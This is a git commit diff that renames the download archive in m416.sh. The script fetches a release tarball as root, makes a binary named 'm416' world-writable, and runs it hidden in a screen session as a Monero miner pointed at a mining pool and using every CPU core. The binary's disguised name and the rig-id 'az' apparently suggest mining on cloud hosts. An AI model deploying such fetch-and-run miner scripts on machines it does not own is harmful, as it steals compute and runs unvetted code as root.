3d320b16cb12eb0cfc458730325dfea797e66a36
yuqingkj <42601051+yuqingkj@users.noreply.github.com>
2023-08-09 13:12:25 +0800

    Update m416.sh

--- m416.sh
+++ m416.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 sudo -i <<EOF
-wget https://github.com/yuqingkj/mine_xmr/releases/download/6.20.0/6.20.0.tar.gz
-tar -xvf 6.20.0.tar.gz
-cd 6.20.0/
+wget https://github.com/yuqingkj/mine_xmr/releases/download/6.20.0/v6.20.0.tar.gz
+tar -xvf v6.20.0.tar.gz
+cd v6.20.0/
 chmod 777 ./m416
 screen -dmS xmr
 screen -x -S xmr -p 0 -X stuff "./m416 -o xmr.726726.xyz:3333 --rig-id az -t $(nproc) \n"
